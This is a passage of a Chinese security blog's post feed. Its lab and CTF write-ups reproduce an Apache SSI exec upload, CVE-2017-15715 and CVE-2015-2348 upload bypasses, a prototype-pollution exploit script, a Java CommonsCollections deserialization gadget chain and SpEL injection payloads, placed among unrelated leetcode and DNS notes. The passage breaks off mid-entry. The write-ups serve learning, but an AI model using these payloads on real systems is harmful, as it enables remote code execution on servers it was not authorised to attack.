          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php常用函数</title>
      <link href="/posts/3d16ce36/"/>
      <url>/posts/3d16ce36/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞复现-Apache SSI远程命令执行</title>
      <link href="/posts/becfc22d/"/>
      <url>/posts/becfc22d/</url>
      
        <content type="html"><![CDATA[<h2 id="SSI远程命令执行"><a href="#SSI远程命令执行" class="headerlink" title="SSI远程命令执行"></a>SSI远程命令执行</h2><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用 <code>&lt;!--#exec cmd=”id” --&gt;</code> 语法执行命令。</p><blockquote><p>shtml 不是 html 而是一种服务器 API,shtml 是服务器动态产生的 htm<br>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p></blockquote><p><img src="/posts/becfc22d/1580369820917.png" alt></p><p>上传之后，点击即可</p><p><img src="/posts/becfc22d/1580369831464.png" alt></p><p>可以尝试上传 shtml 文件来达到getshell的目的</p><p><img src="/posts/becfc22d/1580369842405.png" alt></p><h2 id="CVE-2017-15715-换行符截断"><a href="#CVE-2017-15715-换行符截断" class="headerlink" title="CVE-2017-15715 换行符截断"></a>CVE-2017-15715 换行符截断</h2><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A<br>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p>发送文件上传数据包</p><p><img src="/posts/becfc22d/1580371055451.png" alt></p><p>需要添加一个 <code>\x0a</code></p><p><img src="/posts/becfc22d/1580371064625.png" alt></p><p>上传后解析成功</p><p><img src="/posts/becfc22d/1580371072709.png" alt></p><p>ps:也不知道如何构造文件上传数据包，我是写了一个表单来完成的,然后将相关的参数做一些修改即可</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://192.168.99.100:8080/index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>环境中处理文件上传的代码:</p><pre><code class="php">&lt;?phpif(isset($_FILES[&#39;file&#39;])) {    $name = basename($_POST[&#39;name&#39;]);    $ext = pathinfo($name,PATHINFO_EXTENSION);    if(in_array($ext, [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;])) {        exit(&#39;bad file&#39;);    }    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;./&#39; . $name);</code></pre><h2 id="CVE-2015-2348-php任意文件上传"><a href="#CVE-2015-2348-php任意文件上传" class="headerlink" title="CVE-2015-2348 php任意文件上传"></a>CVE-2015-2348 php任意文件上传</h2><p>漏洞影响版本必须在5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7，详见CVE公告：<a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348" target="_blank" rel="noopener">https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348</a><br>这个漏洞的利用条件比较苛刻，尝试用 php5.5.9 nts 测试没有成功<br>并且测试的时候发现</p><p><img src="/posts/becfc22d/1580397902588.png" alt></p><p>尽管加上了 \x00 但是实际上通过</p><pre><code class="php">$uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];var_dump($uploaded_name);</code></pre><p>获取到的文件名并不会包含 <code>.jpg</code><br>这里就涉及到数据的获取问题了</p><p>文件上传的数据包可以分成这几个部分：</p><p><img src="/posts/becfc22d/1580397931674.png" alt></p><p>第一部分是会存储到 <code>$_FILES</code> 数字中，并且 <code>name</code> 是用来和后端交互的， <code>filename</code> 是固定的一个名字，后端通过 <code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code> 来得到<br>第二部分的数据是存储到 <code>$_POST</code> 和 <code>$_REQUEST</code> 数组中的</p><p><img src="/posts/becfc22d/1580397942131.png" alt></p><p>既然如此，那我就直接写死 <code>$target_path .= &quot;aaa.php\x00.jpg&quot;;</code> 即可进行测试</p><p> php 5.2.17 可以</p><p><img src="/posts/becfc22d/1580397968376.png" alt></p><p>php5.5.9 也可以</p><p><img src="/posts/becfc22d/1580397984801.png" alt></p><p>如果换成 php 7.3.4 nts 、5.3.29、5.4.45、5.6.9则报错</p><p><img src="/posts/becfc22d/1580397995259.png" alt></p><h3 id="漏洞原因："><a href="#漏洞原因：" class="headerlink" title="漏洞原因："></a>漏洞原因：</h3><p>php在5.6.6中将长度比较的安全检查逻辑给去掉了</p><p><img src="/posts/becfc22d/1580398009005.png" alt></p><p>原来有安全检查的代码是这样子的：</p><p><img src="/posts/becfc22d/1580398026408.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/cyjaysun/p/4390930.html" target="_blank" rel="noopener">https://www.cnblogs.com/cyjaysun/p/4390930.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> Apache </tag>
            
            <tag> RCE </tag>
            
            <tag> SSI </tag>
            
            <tag> 截断 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一道leetcode-数组题</title>
      <link href="/posts/734660ee/"/>
      <url>/posts/734660ee/</url>
      
        <content type="html"><![CDATA[<h2 id="整数转罗马数字"><a href="#整数转罗马数字" class="headerlink" title="整数转罗马数字"></a>整数转罗马数字</h2><p>题目虽然不难，但是也整了好久，后来才明白转成罗马数字就是不断地做除法和模</p><p>但是我这里遇到了一个问题，python中的字典本来是无序的，所以我就拆成了两个list来存放</p><pre><code class="python">class Solution(object):    def intToRoman(self, num):        &quot;&quot;&quot;        :type num: int        :rtype: str        &quot;&quot;&quot;        result = &#39;&#39;        nums = [1000,900,500,400,100,90,50,40,10,9,5,4,1]        chars = [&#39;M&#39;,&#39;CM&#39;,&#39;D&#39;,&#39;CD&#39;,&#39;C&#39;,&#39;XC&#39;,&#39;L&#39;,&#39;XL&#39;,&#39;X&#39;,&#39;IX&#39;,&#39;V&#39;,&#39;IV&#39;,&#39;I&#39;]        for i in nums:            x = num // i            num = num % i            result += x*chars[nums.index(i)]        return result</code></pre><p>这样当然是没问题得，但是我看到评论区居然有人用python的字典也成功了</p><p>这就很疑惑了，于是我修改了代码：</p><pre><code class="python">class Solution(object):    def intToRoman(self, num):        &quot;&quot;&quot;        :type num: int        :rtype: str        &quot;&quot;&quot;        result = &quot;&quot;        roman = {1000:&#39;M&#39;,900:&#39;CM&#39;, 500:&#39;D&#39;, 400:&#39;CD&#39;, 100:&#39;C&#39;,90:&#39;XC&#39;, 50:&#39;L&#39;, 40: &#39;XL&#39;,10:&#39;X&#39;,9:&#39;IX&#39;, 5:&#39;V&#39;,4:&#39;IV&#39;, 1:&#39;I&#39;}        for i in roman:            x = num // i            num = num % i            result += x*roman[i]        return result</code></pre><p>居然也过了！！！</p><p>难道leetcode的python解释器不一样？</p><p><img src="/posts/734660ee/1580397588462.png" alt></p><h2 id="罗马数字转整数"><a href="#罗马数字转整数" class="headerlink" title="罗马数字转整数"></a>罗马数字转整数</h2><p>这个题目就更妙了，秒就妙在对于哈希表的处理上</p><p>如果是我想的话，只需要将上个题的哈希表倒过来就行了，但是实际上我们可以这样做：</p><pre><code class="python">d = {&#39;I&#39;:1, &#39;IV&#39;:3, &#39;V&#39;:5, &#39;IX&#39;:8, &#39;X&#39;:10, &#39;XL&#39;:30, &#39;L&#39;:50, &#39;XC&#39;:80, &#39;C&#39;:100, &#39;CD&#39;:300, &#39;D&#39;:500, &#39;CM&#39;:800, &#39;M&#39;:1000}</code></pre><p>本来 <code>IV</code> 是代表4的，但是在这里却减去了1，其余的9，40，90都是类似的</p><pre><code class="python">class Solution:    def romanToInt(self, s: str) -&gt; int:        d = {&#39;I&#39;:1, &#39;IV&#39;:3, &#39;V&#39;:5, &#39;IX&#39;:8, &#39;X&#39;:10, &#39;XL&#39;:30, &#39;L&#39;:50, &#39;XC&#39;:80, &#39;C&#39;:100, &#39;CD&#39;:300, &#39;D&#39;:500, &#39;CM&#39;:800, &#39;M&#39;:1000}        result = 0        for i,n in enumerate(s):            a = max(i-1,0)            b = d.get(s[a:i+1], d[n]) # 每次取两个元素，如果有就说明是4，9这类，如果没有就采取默认的 d[n]            result += b        return result</code></pre><p>不得不说这种方法确实很巧妙，甚至可以浓缩为一句话</p><pre><code class="python">return sum(d.get(s[max(i-1, 0):i+1], d[n]) for i, n in enumerate(s))</code></pre><p>不过效率对比上来看，浓缩之后的速度反而变慢了</p><p><img src="/posts/734660ee/1580397813912.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-dig</title>
      <link href="/posts/f1616294/"/>
      <url>/posts/f1616294/</url>
      
        <content type="html"><![CDATA[<h2 id="基本选项："><a href="#基本选项：" class="headerlink" title="基本选项："></a>基本选项：</h2><p>@&lt;服务器地址&gt;：指定进行域名解析的域名服务器；<br>-b&lt;ip地址&gt;：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求；<br>-f&lt;文件名称&gt;：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息；<br>-P：指定域名服务器所使用端口号；<br>-t&lt;类型&gt;：指定要查询的DNS数据类型；<br>-x&lt;IP地址&gt;：执行逆向域名查询；<br>-4：使用IPv4；<br>-6：使用IPv6；<br>-h：显示指令帮助信息。</p><p>比如我要用Google的DNS</p><p><code>dig prontosil.club @8.8.8.8</code></p><p>查询解析记录<br><code>dig prontosil.club -t CNAME</code></p><p>得到结果：</p><pre><code>;; QUESTION SECTION:;prontosil.club.                        IN      CNAME;; ANSWER SECTION:prontosil.club.         600     IN      CNAME   2zeqwj.coding-pages.com.;; Query time: 55 msec</code></pre><p>查询 TXT 记录</p><p><code>dig _pages-challenge.prontosil.club -t TXT</code></p><p>得到结果：</p><pre><code>;; ANSWER SECTION:_pages-challenge.prontosil.club. 600 IN TXT     &quot;rCAijO55WRowkOABj2JwHDEacVPpxo5rkCtDr2eG7J0=.ItO58cZnxtPdQAIzuUTAumBPxAZ4nwBjsGfmWl/Rhg0=&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> dig </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域名解析记录</title>
      <link href="/posts/b69cd839/"/>
      <url>/posts/b69cd839/</url>
      
        <content type="html"><![CDATA[<h2 id="博客域名解析"><a href="#博客域名解析" class="headerlink" title="博客域名解析"></a>博客域名解析</h2><p>如下是我在腾讯云后台的设置</p><p><img src="/posts/b69cd839/1580398267570.png" alt></p><p>按照腾讯云的解释</p><p><img src="/posts/b69cd839/1580398281271.png" alt></p><p>可以查询到 <a href="http://www.prontosil.club" target="_blank" rel="noopener">www.prontosil.club</a> 的解析记录为</p><p><img src="/posts/b69cd839/1580398293465.png" alt></p><p>经过多次的折腾发现，<code>@</code> 解析记录只能有一个默认，只能有一个记录类型，比如我这里是A记录设置为 <code>@</code>，那么CNAME记录就不能设置为 <code>@</code></p><p>同时我终于发现<code>www</code> 和裸域的区别了，之前还一直以为是同一个</p><h2 id="裸域"><a href="#裸域" class="headerlink" title="裸域"></a>裸域</h2><p>不加 www 的裸域名好处主要是域名更加简短、容易记忆。坏处就多了，讲几个主要的技术原因：<br>裸域名只能绑定 DNS 的 A 记录，不能绑定 CNAME 记录。也就是说你不能把裸域设定为另外域名的别名。很多时候这对管理不是很方便，特别是使用第三方托管服务的时候。如果第三方迁移服务器导致 IP 地址变更，你必须自己去更改 DNS 的 A 记录。</p><h2 id="TXT记录"><a href="#TXT记录" class="headerlink" title="TXT记录"></a>TXT记录</h2><p><img src="/posts/b69cd839/1580398319776.png" alt></p><p>这种可以用来出题</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域名 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript原型链污染</title>
      <link href="/posts/5d5d07b8/"/>
      <url>/posts/5d5d07b8/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h1><h2 id="如何继承"><a href="#如何继承" class="headerlink" title="如何继承"></a>如何继承</h2><p>比如，现在有一个”动物”对象的构造函数。</p><pre><code class="javascript">function Animal(){this.species = &quot;动物&quot;;}</code></pre><p>还有一个”猫”对象的构造函数。</p><pre><code class="JavaScript">function Cat(name,color){　　　　this.name = name;　　　　this.color = color;　　}</code></pre><p>要让<code>Cat</code>这个类去继承<code>Animal</code>类，如果在其他的语言中，一般就是<code>extented</code>即可</p><p>但是在JavaScript中，</p><pre><code class="javascript">Cat.prototype = new Animal();Cat.prototype.constructor = Cat;var cat1 = new Cat(&quot;大毛&quot;,&quot;黄色&quot;);alert(cat1.species); // 动物</code></pre><p>第一行我们直接修改了<code>Cat</code>的<code>prototype</code>属性，让其指向<code>Animal</code></p><p>这一点不难理解，之后所有<code>Cat</code>实例化的对象cat，它的<code>__proto__</code>就会指向<code>Animal</code>(因为<code>Cat.prototype==cat.__proto__</code>)</p><p>但是第二行比较疑惑，<code>Cat.prototype.constructor</code>又代表了什么？</p><p>其实在<code>Cat.prototype</code>中原先是有一个<code>constructor</code>这个属性的，而<code>Cat.prototype.constructor==Cat</code>这个是成立的</p><p>但是我们直接修改了<code>Cat.prototype</code>之后，此时的<code>Cat.prototyep.constructot != Cat</code></p><p>这就比较荒诞了，所以我们要单独修改将这一个属性修改回来</p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="redpwnctf2019-blueprint"><a href="#redpwnctf2019-blueprint" class="headerlink" title="redpwnctf2019 blueprint"></a>redpwnctf2019 blueprint</h3><p>题目的简要功能就是能够发表文章，并且选择是否公开，传递的数据是json格式的</p><p>每一个用户有一个<code>user_id</code>，第一次访问的时候会通过<code>makeId</code>函数给一个id</p><p><img src="/posts/5d5d07b8/1572246225198.png" alt></p><p>调试的时候发现每个用户创建的时候会将一个<code>(userId,user)</code>存入到一个map中，<code>userId</code>就是之前生成的，而这个<code>user</code>对象中就有flag，也就是说每一个用户都有一个flag</p><p>生成的<code>user</code>对象</p><p><img src="/posts/5d5d07b8/1572246345905.png" alt></p><p>之后会将请求的内容给<code>merge</code>到<code>parsedBody</code>中</p><p>查看<code>defaultsDeep</code>的例子：</p><pre><code>_.defaultsDeep({ &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39; } }, { &#39;user&#39;: { &#39;name&#39;: &#39;fred&#39;, &#39;age&#39;: 36 } });// =&gt; { &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39;, &#39;age&#39;: 36 } }</code></pre><p>之后就会将<code>parsedBody</code>中的<code>content</code>和<code>public</code>存放到map中</p><p><img src="/posts/5d5d07b8/1572246569945.png" alt></p><p>之后的功能也不难想了，如果<code>pubic</code>为true就会展示在首页上，如果不为true就会不会展示</p><p>而我们之前提到每一个用户其实都是有一个flag的，只是这个<code>public</code>属性没有进行设置而已。</p><p>思路就是通过原型链污染使得flag能被展示出来</p><p>渲染页面的主要部分如下：</p><pre><code class="javascript">blueprints: Object.entries(user.blueprints).map(([k, v]) =&gt; ({  id: k,  content: v.content,  public: v.public,})),</code></pre><p>exp</p><pre><code class="python">import requestsURL = &quot;http://localhost/&quot;user_id = &quot;559eb9b06eb8c581b74f33c1202bff50&quot;res = requests.post(URL+&quot;make&quot;,cookies={&quot;user_id&quot;:user_id},json={&quot;content&quot;:&quot;aaaa&quot;, &quot;public&quot;:&quot;true&quot;,&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;public&quot;:&quot;true&quot;}}})print(res.text)res2 = requests.get(URL, cookies={&quot;user_id&quot;:user_id})print(res2.text)</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java审计笔记</title>
      <link href="/posts/21b61fbe/"/>
      <url>/posts/21b61fbe/</url>
      
        <content type="html"><![CDATA[<h2 id="反射相关概念"><a href="#反射相关概念" class="headerlink" title="反射相关概念"></a>反射相关概念</h2><p>正常执行一条命令</p><pre><code class="java">Runtime.getRuntime().exec(&quot;calc&quot;);</code></pre><p>如果通过反射来执行：</p><pre><code class="java">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(null), &quot;calc&quot;);</code></pre><p><code>Runtime</code> 的构造方法是私有的，遵循单例模式，所以无法直接调用，但是可以通过调用静态方法 <code>getRuntime</code> 来获得一个 <code>Runtime</code> 对象，这个方法是静态的，并不需要传递类的实例进去(不然就陷入了死循环)，而调用之后返回的结果是一个 <code>Runtime</code> 对象，作为 <code>exec</code> 方法的第一个参数，这是因为 <code>exec</code> 方法不是静态方法</p><p>我们正常执行方法是 <code>[1].method([2], [3], [4]...)</code> ，其实在反射里就是 <code>method.invoke([1], [2], [3], [4]...)</code> </p><p>当然如果分解开来比较好理解一点:</p><pre><code class="java">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);  // 加载 java.lang.Runtime类Method method1 = clazz.getMethod(&quot;getRuntime&quot;);    //获取到getRuntime方法Runtime runtime = (Runtime) method1.invoke(null);  //调用，得到Runtime对象(其实可以直接拿这个对象去调用exec了)//runtime.exec(&quot;calc&quot;) 即可Method method2 = clazz.getMethod(&quot;exec&quot;, String.class); //得到exec方法method2.invoke(runtime, &quot;calc&quot;); //调用exec方法</code></pre><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>java的反序列化是通过<code>ObjectOutputStream</code>和<code>ObjectInputStream</code>两个类来实现的，同时要序列化的类必须实现<code>Serializable</code>接口</p><p>与PHP类似，Java在序列化一个对象的时候会调用<code>writeObject</code>方法，在反序列化一个对象的时候会调用<code>readObject</code>方法</p><h2 id="Apache-CommonsCollections反序列化"><a href="#Apache-CommonsCollections反序列化" class="headerlink" title="Apache CommonsCollections反序列化"></a>Apache CommonsCollections反序列化</h2><p>只要弄懂了反射的逻辑，那么理解 <code>CommonsCollections</code> 的payload也就不难了,重点在构造 <code>transformers</code> 数组的时候</p><pre><code class="java">Transformer[] transformers = new Transformer[]{        new ConstantTransformer(Runtime.class),         new InvokerTransformer(&quot;getMethod&quot;, new Class[]{                String.class, Class[].class}, new Object[]{                &quot;getRuntime&quot;,null}),        new InvokerTransformer(&quot;invoke&quot;, new Class[]{                Object.class, Object[].class}, new Object[]{null,new Object[0]}),        new InvokerTransformer(&quot;exec&quot;, new Class[]{                String.class}, new Object[]{&quot;calc&quot;})};Transformer transformedChain = new ChainedTransformer(transformers);transformedChain.transform(transformers);  //触发</code></pre><p><code>transformers</code> 数组中的每一个对象都会调用一次 <code>transform</code> 函数，<code>ConstantTransformer</code> 直接返回了 <code>Runtime.class</code>  作为下一个 <code>transform</code> 的参数 等价于</p><pre><code>Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);  // 加载 java.lang.Runtime类</code></pre><p>之后 <code>InvokerTransformer</code> 的 <code>transform</code> 接收传过来的 <code>Runtime.class</code> 去调用其 <code>getMethod</code>方法，等价于</p><pre><code>Method method1 = clazz.getMethod(&quot;getRuntime&quot;);    //获取到getRuntime方法</code></pre><p>返回了一个 <code>Method</code>类型的作为下一次 <code>transform</code> 的参数，之后的过程就是分别调用 <code>invoke</code> 和 <code>exec</code> 方法，等价于</p><pre><code>Runtime runtime = (Runtime) method1.invoke(null);  //调用，得到Runtime对象(其实可以直接拿这个对象去调用exec了)runtime.exec(&quot;calc&quot;)</code></pre><p>由于 <code>getRuntime</code> 方法是静态的， <code>invoke</code> 的时候第一个参数不必是类的实例，之后由于已经获取到了 <code>Runtime</code> 的实例就不再需要通过反射去获得 <code>exec</code> 方法再 <code>invoke</code> 了，省去了一点麻烦的步骤</p><p>一开始在分析 <code>InvokerTransformer</code> 的 <code>transform</code> 方法时被绕晕了，还以为是反射的反射，但是如果从函数所起的作用来分析就很明确了</p><p><code>getMethod</code> 和 <code>invoke</code> 方法的原型，所以我们在反射的时候也需要指定这些参数的class</p><pre><code class="java">public Method getMethod(String name, Class&lt;?&gt;... parameterTypes)public Object invoke(Object obj, Object... args)</code></pre><p>但是实际上我们在调用 <code>getMethod</code> 的时候，只需要指定第一个参数为 <code>getRuntime</code> 即可，那么第二个参数我们可以设为 null 或者 <code>new Class[0]</code> ，同理， invoke 方法这里不需要指定参数可以将两个参数都设置为 null</p><p>理解一下 <code>collections.map.TransformedMap</code> 这个类，提供了一个 <code>decorateTransform</code> 方法，可以将普通的map转化为 <code>TransformedMap</code> ，这个函数的原型</p><pre><code class="java">public static Map decorateTransform(Map map, Transformer keyTransformer, Transformer valueTransformer) </code></pre><p>第二个和第三个参数都是 <code>Transformer</code> 类型的，也就是每次更新map的时候，比如对map执行 put操作的时候</p><pre><code class="java">public Object put(Object key, Object value) {    key = transformKey(key);    value = transformValue(value);    return getMap().put(key, value);}</code></pre><p>会针对 key 和 value 执行 transform 操作</p><p>结合之前的 payload, 我们可以编写这个代码弹出计算器</p><pre><code class="java">public class Test {    public static void main(String[] args) {        Transformer[] transformers = new Transformer[]{                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {                        String.class, Class[].class}, new Object[] {                        &quot;getRuntime&quot;, new Class[0]}),                new InvokerTransformer(&quot;invoke&quot;, new Class[] {                        Object.class, Object[].class }, new Object[] {                        null, null }),                new InvokerTransformer(&quot;exec&quot;, new Class[] {                        String.class }, new Object[] {&quot;calc.exe&quot;})};        Transformer transformedChain = new ChainedTransformer(transformers);        Map innerMap = new HashMap();         Map outMap = TransformedMap.decorate(innerMap, null, transformedChain); //转变为 TransformedMap 操作        outMap.put(&quot;key&quot;, &quot;value&quot;);//触发payload    }}</code></pre><p>但是网上给的payload都是针对 <code>setValue</code> 方法触发的payload，这是怎么找到的</p><p>经过调试我发现 <code>AbstractMapEntryDecorator</code> 实现了 <code>Map</code>，其中的  <code>setValue</code> 是这么写的</p><pre><code class="java">public Object setValue(Object object) {    return entry.setValue(object);}</code></pre><p>这个方法之后又被 <code>AbstractInputCheckedMapDecorator</code> 的内部 <code>MapEntry</code> 类重写</p><pre><code class="java">public Object setValue(Object value) {    value = parent.checkSetValue(value); //多了一次 checkSetValue 操作    return entry.setValue(value);}</code></pre><p>这个多出来的 <code>checkSetValue</code> 方法又是 <code>AbstractInputCheckedMapDecorator</code>  的，而 <code>TransformedMap</code> 正是重写了这个方法</p><p><img src="/posts/21b61fbe/1580461320232.png" alt></p><p>所以实际上是的结果是调用了 <code>TransformedMap</code> 的 <code>checkSetValue</code> 方法</p><pre><code class="java">protected Object checkSetValue(Object value) {    return valueTransformer.transform(value);}</code></pre><p>这样就能触发payload了</p><p>之后寻找能够触发 <code>setValue</code> 方法的类，这里利用了 <code>AnnotationInvocationHandler</code></p><p>不过这里似乎只有jdk7才能运行，我开始用的jdk8不能成功</p><p>最后的测试代码</p><pre><code class="java">package com.alibaba.dubbo.demo;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.File;import java.io.FileOutputStream;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Retention;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;import javax.management.ObjectInstance;import com.alibaba.dubbo.common.serialize.ObjectInput;/** * @description: 测试 * @author: Pxy * @create: 2020-01-31 16:21 **/public class Test {        public static void main(String[] args) throws Exception {            Transformer[] transformers = new Transformer[]{                    new ConstantTransformer(Runtime.class),                    new InvokerTransformer(&quot;getMethod&quot;, new Class[] {                            String.class, Class[].class}, new Object[] {                            &quot;getRuntime&quot;, new Class[0]}),                    new InvokerTransformer(&quot;invoke&quot;, new Class[] {                            Object.class, Object[].class }, new Object[] {                            null, new Object[0]}),                    new InvokerTransformer(&quot;exec&quot;, new Class[] {                            String.class }, new Object[] {&quot;calc.exe&quot;})};            Transformer transformedChain = new ChainedTransformer(transformers);            Map innerMap = new HashMap();            innerMap.put(&quot;key&quot;, &quot;value&quot;);            Map outMap = TransformedMap.decorate(innerMap, null, transformedChain);            Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);            Constructor ctor = clazz.getDeclaredConstructor(Class.class, Map.class);            ctor.setAccessible(true);            Object instance = ctor.newInstance(Retention.class, outMap);            File f = new File(&quot;payload.bin&quot;);            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));            out.writeObject(instance);            out.flush();            out.close();            ObjectInputStream input = new ObjectInputStream(new FileInputStream(&quot;payload.bin&quot;));            input.readObject();            input.close();        }}</code></pre><p>先断在这个 <code>AnnotationInvocationHandler</code> 类中</p><p><img src="/posts/21b61fbe/1580469219896.png" alt></p><p>然后触发 <code>checkSetValue</code> 方法</p><p><img src="/posts/21b61fbe/1580469249634.png" alt="1580469249634"></p><p>最后成功弹出计算器</p><h2 id="SPEL表达式注入"><a href="#SPEL表达式注入" class="headerlink" title="SPEL表达式注入"></a>SPEL表达式注入</h2><p>类似于 jinja 表达式，不过更为强大</p><p>编写一个接口进行测试：</p><pre><code class="java">@GetMapping(&quot;/spel&quot;)public String spel(String input) throws  Exception{    SpelExpressionParser parser = new SpelExpressionParser();    Expression expression = (Expression)parser.parseExpression(input);    return expression.getValue().toString();}</code></pre><p>访问 <code>/spel?input=new java.lang.ProcessBuilder(&quot;calc&quot;).start()</code></p><p><img src="/posts/21b61fbe/1580468482834.png" alt></p><h2 id="code-breaking-javacon"><a href="#code-breaking-javacon" class="headerlink" title="code-breaking javacon"></a>code-breaking javacon</h2><p>这道题并不算难，结合了java反射和spel表达式注入</p><p>一个spring框架写的登陆界面，用户名和密码都是admin，有一个remember me可以勾选</p><p><code>application.yml</code>中有一些相关的设置</p><pre><code class="yaml">keywords:  blacklist:     - java.+lang    - Runtime    - exec.*\(user:  username: admin  password: admin  rememberMeKey: c0dehack1nghere1</code></pre><p>有一个黑名单过滤了一些字符，不过可以很容易地用字符串拼接进行绕过</p><p>仔细分析代码，其中有存在一处类似模板渲染的语句</p><pre><code class="java">ParserContext parserContext = new TemplateParserContext();Expression exp = parser.parseExpression(val, parserContext);SmallEvaluationContext evaluationContext = new SmallEvaluationContext();return exp.getValue(evaluationContext).toString();</code></pre><blockquote><p>Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。</p></blockquote><p>这一处位于<code>getAdvanceValue</code>函数中，调用它的是这里：</p><pre><code class="java">@GetMappingpublic String admin(@CookieValue(value = &quot;remember-me&quot;, required = false) String rememberMeValue,                    HttpSession session,                    Model model) {    if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals(&quot;&quot;)) {        String username = userConfig.decryptRememberMe(rememberMeValue);        if (username != null) {            session.setAttribute(&quot;username&quot;, username);        }    }    Object username = session.getAttribute(&quot;username&quot;);    if(username == null || username.toString().equals(&quot;&quot;)) {        return &quot;redirect:/login&quot;;    }    model.addAttribute(&quot;name&quot;, getAdvanceValue(username.toString()));    return &quot;hello&quot;;}</code></pre><p>这里相当于是admin的管理界面，首先会检查<code>rememberMeValue</code>的值，并且尝试去解密其中的用户名，同时加入到<code>session</code>中，之后执行<code>model.addAttribute(&quot;name&quot;, getAdvanceValue(username.toString()));</code></p><p>那么这里的关键就是<code>cookie</code>中的rememberMeValue，由于我们已经知道了加密的算法和密钥(代码都是直接给的)，那么就可以通过伪造<code>rememberMeValue</code>来达到rce</p><p>首先需要一条java的反射链，因为要绕过一些关键字：</p><pre><code 